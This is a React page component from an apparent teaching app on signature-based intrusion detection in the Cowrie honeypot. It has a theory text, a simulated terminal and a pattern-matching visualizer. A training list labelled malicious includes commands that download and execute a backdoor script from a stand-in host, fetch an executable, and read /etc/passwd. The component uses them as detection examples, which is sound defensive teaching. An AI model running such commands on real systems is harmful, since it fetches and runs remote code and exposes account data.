import React, { useState, useRef, useEffect } from 'react';
import AutomatonVisualizer from '../../components/AutomatonVisualizer';
import { Link } from 'react-router-dom';
import { Box, Typography, useTheme } from '@mui/material';
import FullscreenIcon from '@mui/icons-material/Fullscreen';
import FullscreenExitIcon from '@mui/icons-material/FullscreenExit';
import KeyboardIcon from '@mui/icons-material/Keyboard';
import SettingsIcon from '@mui/icons-material/Settings';
import RealTerminal from '../../components/RealTerminal';

// Helper to highlight matches in command (literal or regex)
const highlightCommand = (pattern, command, isRegex) => {
  if (!pattern || !command) return <code className="bg-yellow-100 px-1 rounded text-xs">{command}</code>;
  try {
    let regex;
    if (isRegex) {
      regex = new RegExp(pattern, 'gi');
    } else {
      const safe = pattern.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      regex = new RegExp(safe, 'gi');
    }
    const parts = [];
    let last = 0; let m;
    while ((m = regex.exec(command)) !== null) {
      if (m.index > last) parts.push(<span key={last+'t'}>{command.slice(last, m.index)}</span>);
      const mt = m[0];
      parts.push(<span key={m.index+'h'} className="bg-yellow-300 text-gray-900 rounded px-0.5 font-semibold">{mt}</span>);
      last = m.index + mt.length;
      if (!isRegex && mt.length === 0) break; // safety
    }
    if (last < command.length) parts.push(<span key={last+'r'}>{command.slice(last)}</span>);
    return <code className="bg-yellow-50 px-1 rounded text-xs whitespace-pre-wrap">{parts}</code>;
  } catch {
    return <code className="bg-yellow-100 px-1 rounded text-xs">{command}</code>;
  }
};

// Algorithm Parameters
const algorithmParameters = {
  patternMatching: {
    sensitivity: 0.8, // Pattern matching sensitivity (0-1)
    fuzzyMatching: true, // Enable fuzzy matching for similar patterns
    maxEditDistance: 2, // Maximum edit distance for fuzzy matching
    caseSensitive: false // Case sensitivity in pattern matching
  },
  timeWindow: {
    default: 300, // Default time window in seconds
    min: 60, // Minimum time window
    max: 3600 // Maximum time window
  },
  thresholds: {
    default: 3, // Default threshold for pattern matching
    min: 1, // Minimum threshold
    max: 10 // Maximum threshold
  }
};

// Training Dataset - Real-world examples
const trainingDataset = {
  normal: [
    'ls -la',
    'cd /home/user',
    'cat README.md',
    'mkdir project',
    'git clone https://github.com/example/repo',
    'npm install',
    'python3 script.py',
    'ssh user@server -p 22'
  ],
  malicious: [
    'wget http://malicious.com/backdoor.sh',
    'chmod +x backdoor.sh',
    './backdoor.sh',
    'cat /etc/passwd',
    'nmap -sS 192.168.1.0/24',
    'ssh -o StrictHostKeyChecking=no user@192.168.1.1',
    'curl -O http://suspicious.com/malware.exe'
  ]
};

const SignatureBased = () => {
  const theme = useTheme();
  
  // Dynamic Signature Database - Loaded from backend API with Aho-Corasick optimization
  const [signatureDatabase, setSignatureDatabase] = useState({});
  const [allSignatures, setAllSignatures] = useState([]);

  // Load signatures from backend API
  const loadSignaturesFromAPI = async () => {
    try {
      const response = await fetch('/api/signatures');
      if (!response.ok) throw new Error('Failed to fetch signatures');
      const signatures = await response.json();
      setAllSignatures(signatures);
      
      // Group signatures by type for display
      const grouped = signatures.reduce((acc, sig) => {
        const type = sig.type || 'other';
        if (!acc[type]) {
          acc[type] = {
            name: `${type.charAt(0).toUpperCase() + type.slice(1)} Patterns`,
            patterns: []
          };
        }
        acc[type].patterns.push({
          id: sig.id,
          name: sig.description,
          pattern: sig.pattern,
          description: sig.description,
          severity: 'Medium', // Default severity
          threshold: 1,
          timeWindow: 60,
          regex: sig.regex,
          examples: []
        });
        return acc;
      }, {});
      
      setSignatureDatabase(grouped);
    } catch (error) {
      console.error('Error loading signatures:', error);
      // Fallback to empty database
      setSignatureDatabase({});
    }
  };

  const [activeTab, setActiveTab] = useState('theory');
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [terminalOutput, setTerminalOutput] = useState([]);
  const [detectionResults, setDetectionResults] = useState([]);
  const [userInput, setUserInput] = useState('');
  const [showSettings, setShowSettings] = useState(false);
  const [parameters, setParameters] = useState(algorithmParameters);
  const containerRef = useRef(null);
  const terminalRef = useRef(null);

  // Command history for pattern analysis
  const [commandHistory, setCommandHistory] = useState([]);
  const [timeWindows, setTimeWindows] = useState({});

  // Signature Management removed

  // Detection Log State
  const [detectionLog, setDetectionLog] = useState([]);
  // Polished UI state additions
  const [paused, setPaused] = useState(false);
  const [filterText, setFilterText] = useState('');
  const [showLivePanel, setShowLivePanel] = useState(true);
  const [showAnalytics, setShowAnalytics] = useState(true);
  // Signature Management removed
  const MAX_LIVE = 5;

  // Utility to call backend signature detection
  const detectWithBackend = async (command) => {
    try {
      // Debug: trace request
      // console.debug('[detect] sending', command);
      const response = await fetch('/api/signature/detect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command })
      });
      if (!response.ok) throw new Error('Detection API error');
      const data = await response.json();
      // console.debug('[detect] response', data);
      return data.matches || [];
    } catch (err) {
      return [{ type: 'Error', description: err.message }];
    }
  };

  // Load signatures from API on component mount
  useEffect(() => {
    loadSignaturesFromAPI();
  }, []);

  // Handler for RealTerminal commands
  const handleTerminalCommand = async (command) => {
    if (paused) return; // skip while paused
    const detections = await detectWithBackend(command);
    // console.debug('[terminal] detections', detections);
    if (detections.length > 0) {
      setDetectionResults(prev => [
        ...prev,
        ...detections.map(detection => ({
          ...detection,
          timestamp: new Date().toLocaleTimeString()
        }))
      ]);
    }
  };

  const toggleFullscreen = () => {
    if (!document.fullscreenElement) {
      containerRef.current?.requestFullscreen();
      setIsFullscreen(true);
    } else {
      document.exitFullscreen();
      setIsFullscreen(false);
    }
  };

  useEffect(() => {
    const handleFullscreenChange = () => {
      setIsFullscreen(!!document.fullscreenElement);
    };

    document.addEventListener('fullscreenchange', handleFullscreenChange);
    return () => {
      document.removeEventListener('fullscreenchange', handleFullscreenChange);
    };
  }, []);

  const handleTabChange = (tab) => {
    setActiveTab(tab);
    if (tab === 'simulation') {
      setTerminalOutput([]);
      setDetectionResults([]);
    }
  };

  const handleUserInput = async (e) => {
    if (e.key === 'Enter' && userInput.trim()) {
      const command = userInput.trim();
      setTerminalOutput(prev => [...prev, {
        command,
        output: 'Command executed',
        timestamp: new Date().toLocaleTimeString()
      }]);

      // Call backend for detection
      const detections = await detectWithBackend(command);
      if (detections.length > 0) {
        setDetectionResults(prev => [
          ...prev,
          ...detections.map(detection => ({
            ...detection,
            timestamp: new Date().toLocaleTimeString()
          }))
        ]);
      }

      setUserInput('');
    }
  };

  // Signature Management handlers removed

  // Update detection log when detectionResults change
  useEffect(() => {
    if (detectionResults && detectionResults.length > 0) {
      setDetectionLog(prev => [
        ...prev,
        ...detectionResults.filter(dr => !prev.some(log => log.timestamp === dr.timestamp && log.command === dr.command))
      ]);
    }
  }, [detectionResults]);

  const clearDetections = () => {
    setDetectionResults([]);
    setDetectionLog([]);
  };

  const filteredDetectionLog = detectionLog.filter(entry => {
    if (!filterText) return true;
    const t = filterText.toLowerCase();
    return (
      (entry.command && entry.command.toLowerCase().includes(t)) ||
      (entry.pattern && entry.pattern.toLowerCase().includes(t)) ||
      (entry.description && entry.description.toLowerCase().includes(t)) ||
      (entry.type && entry.type.toLowerCase().includes(t))
    );
  });

  const liveSlice = detectionResults.slice(-MAX_LIVE);

  return (
    <div className="bg-[#FFFFFF] min-h-screen p-4">
      <div className="max-w-6xl mx-auto bg-white rounded-lg p-4">
        <div className="flex justify-between items-center mb-8">
          <div>
            <h1 className="text-4xl font-bold bg-gradient-to-r from-[#1E5780] to-blue-600 bg-clip-text text-transparent">
              Signature-Based Detection
            </h1>
            <p className="text-gray-600 mt-2">Advanced pattern matching with Aho-Corasick algorithm</p>
          </div>
          <div className="flex space-x-3">
            <button
              onClick={() => handleTabChange('theory')}
              className={`px-6 py-3 rounded-xl font-semibold transition-all duration-200 ${
                activeTab === 'theory'
                  ? 'bg-gradient-to-r from-[#1E5780] to-blue-600 text-white shadow-lg transform scale-105'
                  : 'bg-white text-gray-700 hover:bg-gray-50 border-2 border-gray-200 hover:border-[#1E5780]'
              }`}
            >
              Theory
            </button>
            <button
              onClick={() => handleTabChange('simulation')}
              className={`px-6 py-3 rounded-xl font-semibold transition-all duration-200 ${
                activeTab === 'simulation'
                  ? 'bg-gradient-to-r from-[#1E5780] to-blue-600 text-white shadow-lg transform scale-105'
                  : 'bg-white text-gray-700 hover:bg-gray-50 border-2 border-gray-200 hover:border-[#1E5780]'
              }`}
            >
              Simulation
            </button>
            <button
              onClick={() => handleTabChange('visualizer')}
              className={`px-6 py-3 rounded-xl font-semibold transition-all duration-200 ${
                activeTab === 'visualizer'
                  ? 'bg-gradient-to-r from-[#1E5780] to-blue-600 text-white shadow-lg transform scale-105'
                  : 'bg-white text-gray-700 hover:bg-gray-50 border-2 border-gray-200 hover:border-[#1E5780]'
              }`}
            >
              Visualizer
            </button>
          </div>
        </div>

        {activeTab === 'theory' ? (
          <div className="space-y-6">
            <section>
              <h2 className="text-2xl font-semibold text-gray-800 mb-4">What is Signature-Based Detection in Cowrie?</h2>
              <p className="text-gray-600 mb-4">
                Cowrie's signature-based detection focuses on identifying known attack patterns in SSH and Telnet sessions. 
                It monitors login attempts, command execution, and file operations to detect common attack signatures 
                used by malicious actors.
              </p>
            </section>

            <section>
              <h2 className="text-2xl font-semibold text-gray-800 mb-4">How Cowrie Detects Signatures</h2>
              <div className="bg-gray-50 p-6 rounded-lg">
                <ol className="list-decimal list-inside space-y-3 text-gray-600">
                  <li>Monitors SSH and Telnet login attempts</li>
                  <li>Analyzes command patterns and sequences</li>
                  <li>Detects known malicious commands and scripts</li>
                  <li>Logs and alerts on suspicious activities</li>
                </ol>
              </div>
            </section>

            <section>
              <h2 className="text-2xl font-semibold text-gray-800 mb-4">Advantages</h2>
              <ul className="list-disc list-inside space-y-2 text-gray-600">
                <li>High accuracy in detecting known SSH/Telnet attacks</li>
                <li>Real-time monitoring of login attempts</li>
                <li>Detailed logging of attacker behavior</li>
                <li>Safe environment for studying attack patterns</li>
              </ul>
            </section>

            <section>
              <h2 className="text-2xl font-semibold text-gray-800 mb-4">Limitations</h2>
              <ul className="list-disc list-inside space-y-2 text-gray-600">
                <li>Limited to SSH and Telnet protocols</li>
                <li>Cannot detect attacks on other protocols</li>
                <li>May miss sophisticated attack techniques</li>
                <li>Requires regular updates to signature database</li>
              </ul>
            </section>

            <section>
              <h2 className="text-2xl font-semibold text-gray-800 mb-4">Common Signatures Detected by Cowrie</h2>
              <div className="bg-gray-50 p-6 rounded-lg">
                <div className="space-y-4">
                  <div>
                    <h3 className="font-semibold text-gray-800">Brute Force Attacks</h3>
                    <p className="text-gray-600">Multiple failed login attempts with different credentials</p>
                  </div>
                  <div>
                    <h3 className="font-semibold text-gray-800">Malicious Commands</h3>
                    <p className="text-gray-600">Common commands used in attacks like 'wget', 'curl', or 'chmod'</p>
                  </div>
                  <div>
                    <h3 className="font-semibold text-gray-800">System Reconnaissance</h3>
                    <p className="text-gray-600">Commands like 'uname -a', 'cat /etc/passwd', or 'netstat'</p>
                  </div>
                </div>
              </div>
            </section>

            {/* Add new section for Parameters and Algorithms */}
            <div className="bg-white p-6 rounded-lg shadow-md">
              <h2 className="text-xl font-semibold mb-4">Detection Parameters and Algorithms</h2>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h3 className="text-lg font-semibold mb-2">Pattern Matching</h3>
                  <ul className="list-disc pl-5 space-y-2 text-gray-700">
                    <li>Sensitivity: {parameters.patternMatching.sensitivity}</li>
                    <li>Fuzzy Matching: {parameters.patternMatching.fuzzyMatching ? 'Enabled' : 'Disabled'}</li>
                    <li>Max Edit Distance: {parameters.patternMatching.maxEditDistance}</li>
                    <li>Case Sensitivity: {parameters.patternMatching.caseSensitive ? 'Enabled' : 'Disabled'}</li>
                  </ul>
                </div>
                <div>
                  <h3 className="text-lg font-semibold mb-2">Time Windows</h3>
                  <ul className="list-disc pl-5 space-y-2 text-gray-700">
                    <li>Default: {parameters.timeWindow.default} seconds</li>
                    <li>Minimum: {parameters.timeWindow.min} seconds</li>
                    <li>Maximum: {parameters.timeWindow.max} seconds</li>
                  </ul>
                </div>
              </div>
            </div>

            {/* Add new section for Signature Database */}
            <div className="bg-white p-6 rounded-lg shadow-md">
              <h2 className="text-xl font-semibold mb-4">Live Signature Database (Aho-Corasick Optimized)</h2>
              <p className="text-gray-600 mb-4">
                Signatures are loaded dynamically from the database and optimized using the Aho-Corasick algorithm 
                for efficient pattern matching. String patterns use fast substring matching while regex patterns 
                provide flexible detection capabilities.
              </p>
              <div className="space-y-4">
                {Object.entries(signatureDatabase).map(([category, data]) => (
                  <div key={category} className="border rounded-lg p-4">
                    <h3 className="text-lg font-semibold mb-2">{data.name}</h3>
                    <div className="space-y-2">
                      {data.patterns.map(pattern => (
                        <div key={pattern.id} className="pl-4 border-l-2 border-gray-200">
                          <h4 className="font-medium">{pattern.name}</h4>
                          <p className="text-sm text-gray-600">{pattern.description}</p>
                          <p className="text-xs text-gray-500">
                            Pattern: {pattern.pattern} | Type: {pattern.regex ? 'Regex' : 'String (Aho-Corasick)'}
                          </p>
                        </div>
                      ))}
                    </div>
                  </div>
                ))}
                {Object.keys(signatureDatabase).length === 0 && (
                  <div className="text-gray-500">Loading signatures from database...</div>
                )}
              </div>
            </div>
          </div>
        ) : activeTab === 'simulation' ? (
          <div className="space-y-6">
            <div className="grid grid-cols-1 xl:grid-cols-3 gap-6">
              {/* Left: Terminal + Analytics */}
              <div className="xl:col-span-2 space-y-6">
                <div className="bg-white border border-gray-200 rounded-lg shadow-sm p-3">
                  <div className="flex items-center justify-between mb-2">
                    <h3 className="font-semibold text-gray-800 flex items-center gap-2">
                      <KeyboardIcon fontSize="small" className="text-blue-600" /> Interactive Terminal
                    </h3>
                    <div className="flex items-center gap-2">
                      <button
                        onClick={() => setPaused(p => !p)}
                        className={`px-3 py-1 rounded text-xs font-semibold transition-colors ${paused ? 'bg-yellow-600 text-white' : 'bg-gray-100 hover:bg-gray-200 text-gray-700'}`}
                      >{paused ? 'Resume' : 'Pause'}</button>
                      <button
                        onClick={clearDetections}
                        className="px-3 py-1 rounded text-xs font-semibold bg-red-500 text-white hover:bg-red-600"
                      >Clear</button>
                    </div>
                  </div>
                  <RealTerminal onCommand={handleTerminalCommand} simulationType="signature" />
                </div>

                {showAnalytics && (
                  <Box className="relative" sx={{ background: 'white', borderRadius: 3, p: 4, border: '1px solid #e5e7eb' }}>
                    <div className="flex items-center justify-between mb-4">
                      <div className="flex items-center gap-3">
                        <div className="w-3 h-3 bg-gradient-to-r from-blue-400 to-blue-600 rounded-full"></div>
                        <Typography variant="h6" sx={{ fontWeight: 700, color: '#1f2937', fontSize: '1.1rem' }}>
                          Detection Analytics
                        </Typography>
                        <button onClick={() => setShowAnalytics(false)} className="text-xs text-gray-500 hover:text-gray-700">Hide</button>
                      </div>
                      <div className="flex space-x-3">
                        <div className="bg-white border border-gray-200 px-3 py-1.5 rounded-lg shadow-sm">
                          <span className="block text-[10px] uppercase tracking-wide text-gray-500">Events</span>
                          <div className="font-bold text-gray-800 text-sm">{detectionLog.length}</div>
                        </div>
                        <div className="bg-white border border-gray-200 px-3 py-1.5 rounded-lg shadow-sm">
                          <span className="block text-[10px] uppercase tracking-wide text-gray-500">Active</span>
                          <div className="font-bold text-red-600 text-sm">{detectionResults.length}</div>
                        </div>
                      </div>
                    </div>
                    <div className="flex flex-col md:flex-row md:items-center md:space-x-4 space-y-3 md:space-y-0 mb-4">
                      <input
                        type="text"
                        placeholder="Filter (pattern, command, type)..."
                        value={filterText}
                        onChange={(e) => setFilterText(e.target.value)}
                        className="flex-1 border border-gray-300 rounded-lg px-3 py-2 text-sm focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                        aria-label="Filter detection log"
                      />
                      <div className="text-xs text-gray-500">Showing {filteredDetectionLog.length} / {detectionLog.length}</div>
                    </div>
                    {filteredDetectionLog.length === 0 ? (
                      <div className="text-center py-8">
                        <div className="w-14 h-14 mx-auto mb-3 bg-gray-100 rounded-full flex items-center justify-center">
                          <svg className="w-7 h-7 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" /></svg>
                        </div>
                        <div className="text-gray-600 font-medium">No matching events</div>
                        <div className="text-xs text-gray-500 mt-1">Run commands to generate activity</div>
                      </div>
                    ) : (
                      <div className="bg-white rounded-lg p-3 max-h-72 overflow-y-auto border border-gray-100 divide-y divide-gray-50">
                        {filteredDetectionLog.slice().reverse().map((log, idx) => (
                          <div key={idx} className="py-2 group">
                            <div className="flex items-center justify-between">
                              <div className="flex items-center gap-2">
                                <span className="text-[10px] font-semibold px-2 py-0.5 rounded-full bg-gray-200 text-gray-700">{log.type || 'Event'}</span>
                                <span className="font-semibold text-gray-800 text-sm truncate max-w-[180px]" title={log.description}>{log.description}</span>
                              </div>
                              <span className="text-[10px] text-gray-400 bg-gray-50 px-2 py-0.5 rounded">{log.timestamp}</span>
                            </div>
                            <div className="mt-1 grid grid-cols-1 md:grid-cols-2 gap-2 text-[11px] font-mono">
                              <div className="truncate"><span className="text-gray-500">pat:</span> <code className="bg-gray-100 px-1 rounded" title={log.pattern}>{log.pattern}</code></div>
                              <div className="truncate"><span className="text-gray-500">cmd:</span> <code className="bg-yellow-100 px-1 rounded" title={log.command}>{log.command}</code></div>
                            </div>
                          </div>
                        ))}
                      </div>
                    )}
                  </Box>
                )}
              </div>

              {/* Right: Live Detections */}
              <div className="xl:col-span-1 space-y-6">
                {showLivePanel && (
                  <div className="bg-white border border-gray-200 rounded-lg p-4 shadow-sm relative">
                    <div className="flex items-center mb-3">
                      <div className={`w-3 h-3 rounded-full mr-2 ${paused ? 'bg-gray-400' : 'bg-red-500 animate-pulse'}`}></div>
                      <h3 className="font-semibold text-gray-800 text-sm tracking-wide uppercase">Live Detections</h3>
                      <button onClick={() => setShowLivePanel(false)} className="ml-auto text-xs text-gray-400 hover:text-gray-600">Hide</button>
                    </div>
                    {detectionResults.length === 0 ? (
                      <div className="text-gray-500 text-center py-4 italic text-sm">No threats detected</div>
                    ) : (
                      <div className="space-y-3">
                        {liveSlice.map(det => (
                          <div key={det._id || det.timestamp + det.pattern} className="bg-white border border-red-200 rounded-lg p-3 shadow-sm hover:shadow-md transition-all duration-150">
                            <div className="flex items-start justify-between">
                              <div className="flex-1 pr-2">
                                <div className="flex items-center mb-1 flex-wrap gap-1">
                                  <span className="bg-red-100 text-red-700 text-[10px] font-semibold px-2 py-0.5 rounded">{det.type || 'ALERT'}</span>
                                  {det.origin && <span className={`text-[10px] px-2 py-0.5 rounded ${det.origin === 'regex' ? 'bg-purple-100 text-purple-700' : 'bg-green-100 text-green-700'}`}>{det.origin === 'regex' ? 'REGEX' : 'AC'}</span>}
                                  <span className="font-semibold text-red-700 text-sm truncate max-w-[140px]" title={det.description}>{det.description}</span>
                                </div>
                                <div className="text-[11px] text-gray-600 truncate">pat: <code className="bg-gray-100 px-1 rounded" title={det.pattern}>{det.pattern}</code></div>
                                {det.command && (
                                  <div className="text-[11px] text-gray-600 truncate">cmd: {highlightCommand(det.pattern, det.command, det.regex)}</div>
                                )}
                                {(det.start !== undefined && det.end !== undefined) && <div className="text-[10px] text-gray-400">[{det.start},{det.end}]</div>}
                              </div>
                              <span className="text-[10px] text-gray-400 ml-2">{det.timestamp}</span>
                            </div>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                )}
                {/* Signature Management removed */}
              </div>
            </div>
          </div>
        ) : <AutomatonVisualizer signatures={allSignatures} />}

        <div className="flex justify-between mt-8">
          <Link 
            to="/learning-modules"
            className="px-6 py-2 bg-gray-200 text-gray-700 rounded-lg hover:bg-gray-300 transition-colors"
          >
            Back to Learning Modules
          </Link>
          <Link 
            to="/simulation/anomaly"
            className="px-6 py-2 bg-[#1E5780] text-white rounded-lg hover:bg-[#164666] transition-colors"
          >
            Next: Anomaly-Based Detection
          </Link>
        </div>
      </div>
    </div>
  );
};

export default SignatureBased;